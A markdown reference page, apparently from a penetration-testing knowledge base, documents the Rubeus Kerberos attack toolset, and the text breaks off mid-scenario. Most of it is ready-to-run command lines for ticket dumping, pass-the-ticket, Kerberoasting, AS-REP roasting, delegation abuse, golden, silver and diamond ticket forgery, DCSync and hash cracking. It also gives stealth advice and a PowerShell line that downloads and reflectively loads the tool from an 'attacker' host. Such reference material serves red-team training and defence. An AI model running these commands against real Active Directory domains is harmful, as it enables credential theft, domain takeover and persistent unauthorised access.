---
title: "Rubeus - Official Documentation Reference"
category: "tools"
tags: ["kerberos", "active-directory", "tickets", "rubeus"]
last_updated: "2025-12-27"
---

# Rubeus - Official Documentation Reference

Comprehensive reference for Rubeus, a C# toolset for raw Kerberos interaction and abuse in Active Directory environments. This documentation is based on the official GhostPack/Rubeus GitHub repository.

## Table of Contents

- [Overview](#overview)
- [Compilation and Usage](#compilation-and-usage)
- [Ticket Operations](#ticket-operations)
  - [asktgt - Request TGT](#asktgt---request-tgt)
  - [asktgs - Request TGS](#asktgs---request-tgs)
  - [renew - Renew Tickets](#renew---renew-tickets)
  - [ptt - Pass-the-Ticket](#ptt---pass-the-ticket)
  - [purge - Purge Tickets](#purge---purge-tickets)
  - [describe - Analyze Tickets](#describe---analyze-tickets)
  - [dump - Extract Tickets](#dump---extract-tickets)
  - [triage - List Tickets](#triage---list-tickets)
  - [klist - Detailed Ticket Listing](#klist---detailed-ticket-listing)
- [Kerberoasting](#kerberoasting)
- [AS-REP Roasting](#as-rep-roasting)
- [S4U Delegation Attacks](#s4u-delegation-attacks)
- [Constrained Delegation Abuse](#constrained-delegation-abuse)
- [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
- [Golden Ticket Operations](#golden-ticket-operations)
- [Silver Ticket Operations](#silver-ticket-operations)
- [Diamond Tickets](#diamond-tickets)
- [Ticket Monitoring and Harvesting](#ticket-monitoring-and-harvesting)
- [Cross-Domain Attacks](#cross-domain-attacks)
- [Practical AD Attack Scenarios](#practical-ad-attack-scenarios)
- [Command Reference](#command-reference)
- [OpSec Considerations](#opsec-considerations)
- [References](#references)

---

## Overview

Rubeus is a C# toolset for raw Kerberos interaction and abuse, developed by Will Schroeder (harmj0y) as part of the GhostPack project. It implements many Kerberos abuse techniques previously available only through mimikatz or custom tooling.

### Key Features

- **Pure C# Implementation**: Operates entirely within managed code, making it suitable for in-memory execution via `execute-assembly` (Cobalt Strike) or reflective loading
- **No External Dependencies**: Does not rely on mimikatz or other external tools
- **Comprehensive Kerberos Support**: Covers ticket requests, manipulation, attacks, and forging
- **Multiple Execution Modes**: Supports direct execution, in-memory loading, and integration with C2 frameworks

### Capabilities Summary

| Category | Actions |
|----------|---------|
| Ticket Operations | asktgt, asktgs, renew, ptt, purge, describe, dump, triage, klist |
| Ticket Attacks | kerberoast, asreproast |
| Delegation Abuse | s4u (S4U2Self, S4U2Proxy) |
| Ticket Forging | golden, silver, diamond |
| Monitoring | monitor, harvest |
| Utilities | hash, createnetonly, changepw, currentluid |

---

## Compilation and Usage

### Prerequisites

- Visual Studio 2019 or later (or MSBuild)
- .NET Framework 4.0 or higher
- Windows environment for compilation

### Compile from Source

```powershell
# Clone repository
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus

# Build with Visual Studio
# Open Rubeus.sln and build in Release mode

# Or use MSBuild from command line
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe Rubeus.sln /p:Configuration=Release

# Output: Rubeus\bin\Release\Rubeus.exe
```

### Basic Execution

```powershell
# Direct execution
Rubeus.exe <action> [options]

# View help
Rubeus.exe -h
Rubeus.exe <action> -h
```

### In-Memory Execution

```powershell
# PowerShell - Download and load assembly
$data = (New-Object Net.WebClient).DownloadData('http://attacker/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("triage".Split())

# PowerShell - From local file
$assem = [System.Reflection.Assembly]::LoadFile("C:\tools\Rubeus.exe")
[Rubeus.Program]::Main("kerberoast /nowrap".Split())

# Cobalt Strike
execute-assembly /path/to/Rubeus.exe triage

# With arguments
execute-assembly /path/to/Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local /ptt
```

### Output Formats

```powershell
# Base64 ticket output (default) - for copy/paste
Rubeus.exe asktgt /user:admin /password:Pass123!

# Clean base64 without line wrapping
Rubeus.exe asktgt /user:admin /password:Pass123! /nowrap

# Save to .kirbi file
Rubeus.exe asktgt /user:admin /password:Pass123! /outfile:admin.kirbi

# Inject directly into session
Rubeus.exe asktgt /user:admin /password:Pass123! /ptt

# Save multiple tickets to directory
Rubeus.exe dump /outdir:C:\tickets\
```

---

## Ticket Operations

### asktgt - Request TGT

Request a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC).

#### With Password

```powershell
# Basic TGT request
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local

# Request and inject (Pass-the-Ticket)
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local /ptt

# Save to file
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local /outfile:admin.kirbi

# Specify encryption type
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local /enctype:aes256

# Specify domain controller
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local /dc:dc01.corp.local
```

#### With NTLM Hash (Overpass-the-Hash)

```powershell
# Request TGT using RC4/NTLM hash
Rubeus.exe asktgt /user:admin /rc4:64fbae31cc352fc26af97cbdef151e03 /domain:corp.local /ptt

# Using DES key
Rubeus.exe asktgt /user:admin /des:7ec1c45ddcc12345 /domain:corp.local /ptt
```

#### With AES Keys (More Stealthy)

```powershell
# AES256 key
Rubeus.exe asktgt /user:admin /aes256:aes256keyhere... /domain:corp.local /ptt

# AES128 key
Rubeus.exe asktgt /user:admin /aes128:aes128keyhere... /domain:corp.local /ptt

# OpSec mode (requests AES, avoids RC4)
Rubeus.exe asktgt /user:admin /aes256:aes256keyhere... /domain:corp.local /opsec /ptt
```

#### With Certificate (PKINIT)

```powershell
# Request TGT using certificate
Rubeus.exe asktgt /user:admin /certificate:admin.pfx /password:certpass /domain:corp.local /ptt

# From certificate store
Rubeus.exe asktgt /user:admin /certificate:thumbprint /domain:corp.local /ptt
```

#### Advanced Options

```powershell
# Create new logon session and inject
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local /createnetonly:C:\Windows\System32\cmd.exe /show

# Request with specific LUID
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local /luid:0x123456

# Request forwardable TGT
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local /forwardable

# Suppress verbose output
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local /quiet
```

### asktgs - Request TGS

Request a Ticket Granting Service (TGS) ticket for specific services.

```powershell
# Request TGS using existing TGT (from base64)
Rubeus.exe asktgs /ticket:doIFNjCCBTK... /service:cifs/fileserver.corp.local

# Using TGT from file
Rubeus.exe asktgs /ticket:admin.kirbi /service:cifs/fileserver.corp.local

# Request and inject
Rubeus.exe asktgs /ticket:admin.kirbi /service:cifs/fileserver.corp.local /ptt

# Multiple services
Rubeus.exe asktgs /ticket:admin.kirbi /service:cifs/server.corp.local,http/server.corp.local

# Specify encryption type
Rubeus.exe asktgs /ticket:admin.kirbi /service:cifs/server.corp.local /enctype:aes256

# Use TGT from current session
Rubeus.exe asktgs /service:cifs/fileserver.corp.local /ptt

# Cross-realm TGS request
Rubeus.exe asktgs /ticket:tgt.kirbi /service:cifs/server.child.corp.local /dc:dc01.child.corp.local

# Save multiple tickets to directory
Rubeus.exe asktgs /ticket:tgt.kirbi /service:cifs/server.corp.local,http/server.corp.local /outdir:C:\tickets\
```

### renew - Renew Tickets

Renew Kerberos tickets before expiration.

```powershell
# Renew from base64
Rubeus.exe renew /ticket:doIFNjCCBTK...

# Renew from file
Rubeus.exe renew /ticket:admin.kirbi

# Renew and inject
Rubeus.exe renew /ticket:admin.kirbi /ptt

# Renew and save
Rubeus.exe renew /ticket:admin.kirbi /outfile:renewed.kirbi

# Auto-renew (continuous renewal until max time)
Rubeus.exe renew /ticket:admin.kirbi /autorenew

# Specify DC
Rubeus.exe renew /ticket:admin.kirbi /dc:dc01.corp.local /ptt
```

**Note**: Tickets can only be renewed if the "renewable" flag is set and current time is before RenewTill time.

### ptt - Pass-the-Ticket

Inject Kerberos tickets into the current or specified logon session.

```powershell
# Inject from base64
Rubeus.exe ptt /ticket:doIFNjCCBTK...

# Inject from file
Rubeus.exe ptt /ticket:admin.kirbi

# Inject multiple tickets
Rubeus.exe ptt /ticket:ticket1.kirbi /ticket:ticket2.kirbi

# Inject into specific LUID
Rubeus.exe ptt /luid:0x123456 /ticket:admin.kirbi

# Inject all tickets from directory
Rubeus.exe ptt /ticketdir:C:\tickets\
```

#### Pass-the-Ticket Workflow

```powershell
# 1. Request TGT with credentials (on attacker machine)
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local /nowrap

# 2. Copy the base64 ticket output

# 3. On target machine, inject ticket
Rubeus.exe ptt /ticket:doIFNjCCBTK...

# 4. Verify ticket
Rubeus.exe klist

# 5. Access resources with new identity
dir \\dc01.corp.local\c$
```

### purge - Purge Tickets

Remove Kerberos tickets from the session.

```powershell
# Purge all tickets from current session
Rubeus.exe purge

# Purge tickets from specific LUID
Rubeus.exe purge /luid:0x123456
```

### describe - Analyze Tickets

Parse and display ticket contents.

```powershell
# Describe from base64
Rubeus.exe describe /ticket:doIFNjCCBTK...

# Describe from file
Rubeus.exe describe /ticket:admin.kirbi

# Include PAC (Privilege Attribute Certificate) details
Rubeus.exe describe /ticket:admin.kirbi /pac

# Output includes:
#   UserName: admin@CORP.LOCAL
#   UserRealm: CORP.LOCAL
#   ServiceName: krbtgt/CORP.LOCAL
#   ServiceRealm: CORP.LOCAL
#   StartTime: 12/27/2025 10:30:00 AM
#   EndTime: 12/27/2025 8:30:00 PM
#   RenewTill: 1/3/2026 10:30:00 AM
#   Flags: name_canonicalize, pre_authent, renewable, forwardable
#   KeyType: aes256_cts_hmac_sha1_96
```

### dump - Extract Tickets

Extract Kerberos tickets from memory (requires elevation).

```powershell
# Dump all tickets from all sessions
Rubeus.exe dump

# Dump from specific LUID
Rubeus.exe dump /luid:0x3e7

# Dump specific user's tickets
Rubeus.exe dump /user:admin

# Dump only TGTs
Rubeus.exe dump /service:krbtgt

# Dump specific service tickets
Rubeus.exe dump /service:cifs

# Output to directory
Rubeus.exe dump /outdir:C:\tickets\

# Clean base64 output
Rubeus.exe dump /nowrap

# Combine filters
Rubeus.exe dump /user:admin /service:krbtgt /nowrap
```

### triage - List Tickets

Quick overview of Kerberos tickets.

```powershell
# Current session
Rubeus.exe triage

# All sessions (elevated)
Rubeus.exe triage /all

# Filter by user
Rubeus.exe triage /user:admin

# Filter by service
Rubeus.exe triage /service:krbtgt

# Specify LUID
Rubeus.exe triage /luid:0x3e7
```

### klist - Detailed Ticket Listing

Detailed Kerberos ticket information.

```powershell
# Current session
Rubeus.exe klist

# Specific LUID
Rubeus.exe klist /luid:0x3e7

# All sessions
Rubeus.exe klist /all

# Output tickets in base64
Rubeus.exe klist /base64

# Include additional info
Rubeus.exe klist /all /base64 /nowrap
```

---

## Kerberoasting

Kerberoasting extracts TGS tickets for service accounts (accounts with SPNs) to crack offline.

### Basic Kerberoast

```powershell
# Roast all kerberoastable accounts
Rubeus.exe kerberoast

# Output to file
Rubeus.exe kerberoast /outfile:kerberoast.txt

# Clean output without line wrapping
Rubeus.exe kerberoast /nowrap

# Statistics only (enumerate without requesting tickets)
Rubeus.exe kerberoast /stats
```

### Targeted Kerberoast

```powershell
# Target specific user
Rubeus.exe kerberoast /user:svc_sql

# Target specific SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/sql.corp.local:1433

# Target users from file
Rubeus.exe kerberoast /users:svc_accounts.txt

# Target specific OU
Rubeus.exe kerberoast /ou:OU=ServiceAccounts,DC=corp,DC=local
```

### Stealthy Kerberoast

```powershell
# Request AES tickets (less suspicious than RC4)
Rubeus.exe kerberoast /aes

# Use TGT delegation trick
Rubeus.exe kerberoast /tgtdeleg

# OpSec mode
Rubeus.exe kerberoast /opsec

# Delay between requests (milliseconds)
Rubeus.exe kerberoast /delay:1000

# Random jitter for delays
Rubeus.exe kerberoast /delay:1000 /jitter:30
```

### Kerberoast with Alternate Credentials

```powershell
# With plaintext password
Rubeus.exe kerberoast /creduser:corp.local\user /credpassword:Pass123!

# With NTLM hash
Rubeus.exe kerberoast /creduser:corp.local\user /rc4:hash

# With TGT ticket
Rubeus.exe kerberoast /ticket:tgt.kirbi
```

### Output Formats

```powershell
# Hashcat format (default)
Rubeus.exe kerberoast
# $krb5tgs$23$*user$realm$spn*$hash...

# John format
Rubeus.exe kerberoast /format:john
# $krb5tgs$user:hash

# Simple format
Rubeus.exe kerberoast /simple
```

### Cracking Kerberoast Hashes

```bash
# RC4 (TGS-REP etype 23) - Hashcat mode 13100
hashcat -m 13100 kerberoast.txt wordlist.txt

# With rules
hashcat -m 13100 kerberoast.txt wordlist.txt -r best64.rule

# AES256 (TGS-REP etype 18) - Mode 19700
hashcat -m 19700 kerberoast_aes.txt wordlist.txt

# AES128 (TGS-REP etype 17) - Mode 19600
hashcat -m 19600 kerberoast_aes128.txt wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt kerberoast_john.txt
```

### Finding Kerberoastable Users

```powershell
# PowerView
Get-DomainUser -SPN

# LDAP Filter
(&(objectCategory=user)(servicePrincipalName=*))

# BloodHound Cypher
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames
```

---

## AS-REP Roasting

AS-REP Roasting targets accounts with "Do not require Kerberos preauthentication" enabled.

### Basic AS-REP Roast

```powershell
# Roast all vulnerable users (requires domain context)
Rubeus.exe asreproast

# Output to file in hashcat format
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# John format
Rubeus.exe asreproast /format:john /outfile:asrep_john.txt

# Clean output
Rubeus.exe asreproast /nowrap
```

### Targeted AS-REP Roast

```powershell
# Target specific user
Rubeus.exe asreproast /user:svc_backup

# Target users from file
Rubeus.exe asreproast /users:targets.txt

# Specify domain and DC
Rubeus.exe asreproast /domain:corp.local /dc:dc01.corp.local

# Target specific OU
Rubeus.exe asreproast /ou:OU=Users,DC=corp,DC=local
```

### Unauthenticated AS-REP Roast

AS-REP Roasting can be performed without domain credentials if you know vulnerable usernames:

```powershell
# No domain credentials needed
Rubeus.exe asreproast /user:svc_backup /domain:corp.local /dc:10.10.10.1

# With user list
Rubeus.exe asreproast /users:users.txt /domain:corp.local /dc:10.10.10.1
```

### Cracking AS-REP Hashes

```bash
# Hashcat mode 18200
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# With rules
hashcat -m 18200 asrep_hashes.txt wordlist.txt -r best64.rule

# John the Ripper
john --wordlist=wordlist.txt asrep_john.txt
```

### Finding AS-REP Roastable Users

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired

# LDAP Filter
(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# BloodHound Cypher
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

---

## S4U Delegation Attacks

Service for User (S4U) extensions enable impersonation attacks via delegation.

### S4U2Self - Obtain TGS for Any User

S4U2Self allows a service to obtain a TGS for any user to itself:

```powershell
# Basic S4U2Self
Rubeus.exe s4u /user:ComputerAccount$ /rc4:COMPUTER_HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt

# With AES key
Rubeus.exe s4u /user:ComputerAccount$ /aes256:COMP_AES256 /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt

# Using TGT ticket
Rubeus.exe s4u /ticket:service_tgt.kirbi /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt
```

### S4U2Proxy - Forward TGS to Another Service

S4U2Proxy extends S4U2Self to request TGS for another service:

```powershell
# S4U2Self + S4U2Proxy chain
Rubeus.exe s4u /user:svc_web$ /rc4:SVC_HASH /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt

# With alternate service name
Rubeus.exe s4u /user:svc_web$ /rc4:SVC_HASH /impersonateuser:administrator /msdsspn:http/server.corp.local /altservice:cifs /ptt

# Specify domain and DC
Rubeus.exe s4u /user:svc_web$ /rc4:SVC_HASH /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /domain:corp.local /dc:dc01.corp.local /ptt
```

### S4U with Existing Ticket

```powershell
# Use existing TGT for S4U operations
Rubeus.exe s4u /ticket:base64_TGT /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt

# From file
Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt

# Self-only (just S4U2Self, no S4U2Proxy)
Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:administrator /self /ptt
```

### Protected Users Considerations

Users in the "Protected Users" group cannot be impersonated via S4U:

```powershell
# Check if user is in Protected Users
Get-ADGroupMember "Protected Users"
```

---

## Constrained Delegation Abuse

Abuse accounts with msDS-AllowedToDelegateTo attribute configured.

### Identify Constrained Delegation

```powershell
# PowerView - Find computers
Get-DomainComputer -TrustedToAuth

# PowerView - Find users
Get-DomainUser -TrustedToAuth

# LDAP Filter - Computers
(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))

# LDAP Filter - Users
(&(objectCategory=user)(msDS-AllowedToDelegateTo=*))

# Check delegation targets
Get-DomainComputer svc_sql | Select-Object -ExpandProperty msDS-AllowedToDelegateTo
```

### Abuse Constrained Delegation

```powershell
# Step 1: Get TGT for delegating account
Rubeus.exe asktgt /user:svc_sql /rc4:HASH /domain:corp.local /outfile:svc.kirbi

# Step 2: S4U to impersonate admin to allowed service
Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt

# Combined (one command)
Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt

# With AES key
Rubeus.exe s4u /user:svc_sql /aes256:KEY /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt
```

### Alternate Service Name Abuse

The SPN in the ticket can be changed to any service on the same target:

```powershell
# Configured for HTTP, abuse for CIFS
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator /msdsspn:http/server.corp.local /altservice:cifs /ptt

# Multiple alternate services
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator /msdsspn:http/server.corp.local /altservice:cifs,host,ldap /ptt
```

---

## Resource-Based Constrained Delegation

RBCD abuses the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.

### RBCD Prerequisites

1. Control an account with an SPN (computer account or service account)
2. Write access to target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute

### Attack Steps

```powershell
# Step 1: Identify controlled account with SPN (or create computer account)
# Computer accounts automatically have SPNs

# Step 2: Configure RBCD on target (requires GenericWrite/GenericAll on target)
# Using PowerView:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-CONTROLLED_SID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity target$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 3: Get TGT for controlled account
Rubeus.exe asktgt /user:controlled$ /rc4:CONTROLLED_HASH /outfile:controlled.kirbi

# Step 4: S4U attack
Rubeus.exe s4u /ticket:controlled.kirbi /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt

# Step 5: Access target
dir \\target.corp.local\c$
```

### RBCD with New Computer Account

If ms-DS-MachineAccountQuota > 0, any domain user can add computer accounts:

```powershell
# Step 1: Create computer account (Impacket)
python3 addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123' corp.local/user:pass

# Step 2: Get computer account hash
python3 secretsdump.py corp.local/YOURPC$:'Password123'@dc01.corp.local -just-dc-user 'YOURPC$'

# Step 3: Configure RBCD on target (PowerView with GenericWrite)
$SID = Get-DomainComputer YOURPC -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity target$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 4: S4U attack with Rubeus
Rubeus.exe s4u /user:YOURPC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt
```

### Combined RBCD Attack

```powershell
# All-in-one using Rubeus
Rubeus.exe s4u /user:YOURPC$ /aes256:KEY /impersonateuser:administrator /msdsspn:cifs/target.corp.local /domain:corp.local /dc:dc01.corp.local /ptt

# Verify access
dir \\target.corp.local\c$
psexec \\target.corp.local cmd.exe
```

---

## Golden Ticket Operations

Forge a TGT using the krbtgt account hash for persistent domain access.

### Create Golden Ticket

```powershell
# With NTLM hash
Rubeus.exe golden /rc4:KRBTGT_HASH /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /ptt

# With AES256 key (stealthier)
Rubeus.exe golden /aes256:KRBTGT_AES256 /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /ptt

# Save to file
Rubeus.exe golden /aes256:KRBTGT_AES256 /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /outfile:golden.kirbi

# With both keys (for compatibility)
Rubeus.exe golden /rc4:KRBTGT_RC4 /aes256:KRBTGT_AES256 /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /ptt
```

### Golden Ticket Options

```powershell
# Specify User ID (500 = built-in Administrator)
Rubeus.exe golden /aes256:KEY /user:FakeAdmin /id:500 /domain:corp.local /sid:S-1-5-21-... /ptt

# Specify group memberships
# 512=Domain Admins, 518=Schema Admins, 519=Enterprise Admins, 520=Group Policy Creator Owners
Rubeus.exe golden /aes256:KEY /user:FakeAdmin /groups:512,518,519,520 /domain:corp.local /sid:S-1-5-21-... /ptt

# Customize ticket lifetime
Rubeus.exe golden /aes256:KEY /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /startoffset:0 /endin:600 /renewmax:10080 /ptt

# Add extra SIDs (for forest attacks)
Rubeus.exe golden /aes256:KEY /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /sids:S-1-5-21-PARENT-519 /ptt

# Non-existent user (can sometimes evade detection)
Rubeus.exe golden /aes256:KEY /user:NonExistentAdmin /id:1337 /groups:512 /domain:corp.local /sid:S-1-5-21-... /ptt
```

### Get Required Information

```powershell
# DCSync with mimikatz
lsadump::dcsync /user:krbtgt /domain:corp.local

# DCSync with secretsdump (Impacket)
python3 secretsdump.py corp.local/admin:Pass123@dc01.corp.local -just-dc-user krbtgt

# Get Domain SID
whoami /user  # Shows current user SID, domain SID is everything before last dash-number
wmic useraccount get name,sid
Get-ADDomain | Select-Object DomainSID
```

---

## Silver Ticket Operations

Forge a TGS for a specific service using the service account hash.

### Create Silver Ticket

```powershell
# CIFS service (file share access)
Rubeus.exe silver /service:cifs/fileserver.corp.local /rc4:SERVICE_HASH /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /ptt

# HTTP service (web/WinRM)
Rubeus.exe silver /service:http/webserver.corp.local /rc4:SERVICE_HASH /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /ptt

# LDAP service
Rubeus.exe silver /service:ldap/dc01.corp.local /rc4:DC_HASH /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /ptt

# HOST service (PSExec, scheduled tasks)
Rubeus.exe silver /service:host/server.corp.local /rc4:COMP_HASH /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /ptt
```

### Silver Ticket with AES (Stealthier)

```powershell
Rubeus.exe silver /service:cifs/server.corp.local /aes256:SERVICE_AES256 /user:Admin /domain:corp.local /sid:S-1-5-21-... /ptt
```

### Common Service SPNs for Silver Tickets

| Service | SPN Format | Use Case |
|---------|------------|----------|
| CIFS | cifs/hostname | SMB/File shares |
| HTTP | http/hostname | WinRM/Web services |
| HOST | host/hostname | PsExec/Scheduled tasks |
| LDAP | ldap/hostname | LDAP queries |
| MSSQLSvc | mssqlsvc/hostname:port | SQL Server |
| WSMAN | wsman/hostname | PowerShell Remoting |
| RPCSS | rpcss/hostname | WMI |
| TERMSRV | termsrv/hostname | RDP |

### Get Service Account Hash

```powershell
# For services running as SYSTEM, use computer account hash
# Dump from target machine:
mimikatz # sekurlsa::logonpasswords
# Look for COMPUTER$ account

# For services with dedicated service account, DCSync:
lsadump::dcsync /user:svc_sql /domain:corp.local
```

---

## Diamond Tickets

Diamond tickets modify a legitimately requested TGT, making them harder to detect than Golden Tickets.

### Create Diamond Ticket

```powershell
# Request TGT and modify PAC with krbtgt key
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:admin /password:Pass123! /enctype:aes /domain:corp.local /dc:dc01.corp.local /ticketuser:FakeAdmin /ticketuserid:500 /groups:512 /ptt

# Using hash instead of password
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:admin /rc4:HASH /enctype:aes /domain:corp.local /dc:dc01.corp.local /ticketuser:FakeAdmin /ticketuserid:500 /groups:512 /ptt

# Using TGT delegation
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /tgtdeleg /ticketuser:FakeAdmin /ticketuserid:500 /groups:512 /ptt

# Using existing TGT
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /ticket:existing_tgt.kirbi /ticketuser:FakeAdmin /ticketuserid:500 /groups:512 /ptt
```

### Diamond Ticket Options

```powershell
# Add extra SIDs
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:admin /password:Pass123! /ticketuser:FakeAdmin /ticketuserid:500 /groups:512 /sids:S-1-5-21-...-519 /ptt

# Specify ticket lifetime
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:admin /password:Pass123! /ticketuser:FakeAdmin /ticketuserid:500 /groups:512 /rangeend:600 /rangeinterval:60 /ptt
```

### Diamond vs Golden Ticket Comparison

| Aspect | Golden Ticket | Diamond Ticket |
|--------|---------------|----------------|
| TGT Source | Fully forged | Modified real TGT |
| AS-REQ Event | Missing | Present (4768) |
| Detection | Easier (no preceding AS-REQ) | Harder (has AS-REQ) |
| PAC Validation | May fail strict checks | More likely to pass |
| Required Keys | krbtgt hash | krbtgt hash + valid creds |

---

## Ticket Monitoring and Harvesting

### Monitor - Real-time Ticket Capture

Monitor for new TGTs as users log in (requires elevation):

```powershell
# Monitor all new TGTs
Rubeus.exe monitor

# With specific interval (milliseconds)
Rubeus.exe monitor /interval:5000

# Monitor specific user
Rubeus.exe monitor /targetuser:administrator

# Filter by domain
Rubeus.exe monitor /filteruser:corp.local

# Output to file
Rubeus.exe monitor /outfile:captured_tgts.txt

# Clean output
Rubeus.exe monitor /nowrap

# Monitor multiple users
Rubeus.exe monitor /targetuser:admin,svc_backup,domain_admin /interval:5000

# Use registry (may be stealthier)
Rubeus.exe monitor /registry
```

### Harvest - Periodic TGT Collection

Automatically collect and optionally renew TGTs:

```powershell
# Harvest TGTs every 5 minutes (300 seconds)
Rubeus.exe harvest /interval:300

# Output harvested tickets
Rubeus.exe harvest /interval:300 /outfile:harvested.txt

# Harvest with renewal (keeps tickets valid)
Rubeus.exe harvest /interval:300 /renewtickets

# Specific LUID
Rubeus.exe harvest /luid:0x3e7 /interval:300
```

### Monitor vs Harvest

| Feature | Monitor | Harvest |
|---------|---------|---------|
| Purpose | Capture new TGTs | Collect existing TGTs |
| Timing | Real-time on logon | Periodic collection |
| Renewal | No | Yes (optional) |
| Use Case | Credential theft | Maintaining access |

---

## Cross-Domain Attacks

### Inter-Domain Trust Ticket Requests

```powershell
# Request referral ticket to child domain
Rubeus.exe asktgs /ticket:parent_tgt.kirbi /service:krbtgt/child.corp.local /dc:dc01.corp.local

# Use referral to access child domain resources
Rubeus.exe asktgs /ticket:referral.kirbi /service:cifs/server.child.corp.local /dc:dc01.child.corp.local /ptt
```

### Golden Ticket for Parent Domain Access

```powershell
# Create Golden Ticket with Enterprise Admins SID from parent
# 519 = Enterprise Admins group
Rubeus.exe golden /aes256:KRBTGT_KEY /user:admin /domain:child.corp.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-PARENT-SID-519 /ptt

# Access parent domain DC
dir \\dc01.corp.local\c$
```

### SID History Injection

```powershell
# Golden Ticket with Domain Admins from another domain
Rubeus.exe golden /aes256:KRBTGT_KEY /user:admin /domain:corp.local /sid:S-1-5-21-... /sids:S-1-5-21-OTHERDOMAIN-512 /ptt
```

### Trust Key Abuse

```powershell
# If you have inter-realm trust key
Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:TRUST_KEY /dc:dc01.child.corp.local

# Request TGS in target domain
Rubeus.exe asktgs /ticket:trust_ticket.kirbi /service:cifs/dc01.corp.local /dc:dc01.corp.local /ptt
```

---

## Practical AD Attack Scenarios

### Scenario 1: Lateral Movement with Overpass-the-Hash

```powershell
# 1. Obtain NTLM hash (mimikatz, secretsdump, etc.)
# 2. Request TGT and inject
Rubeus.exe asktgt /user:admin /rc4:64fbae31cc352fc26af97cbdef151e03 /domain:corp.local /ptt

# 3. Access target resources
dir \\dc01.corp.local\c$
psexec \\dc01.corp.local cmd.exe
```

### Scenario 2: Kerberoast Attack Chain

```powershell
# 1. Enumerate kerberoastable accounts
Rubeus.exe kerberoast /stats

# 2. Target high-value accounts
Rubeus.exe kerberoast /user:svc_sql /nowrap /outfile:svc_sql_hash.txt

# 3. Crack offline
hashcat -m 13100 svc_sql_hash.txt wordlist.txt

# 4. Use cracked password
Rubeus.exe asktgt /user:svc_sql /password:CrackedPassword /domain:corp.local /ptt
```

### Scenario 3: Constrained Delegation to Domain Admin

```powershell
# 1. Identify constrained delegation
Get-DomainComputer -TrustedToAuth | Select name,msds-allowedtodelegateto

# 2. Compromise delegating account and get hash

# 3. S4U attack to impersonate DA
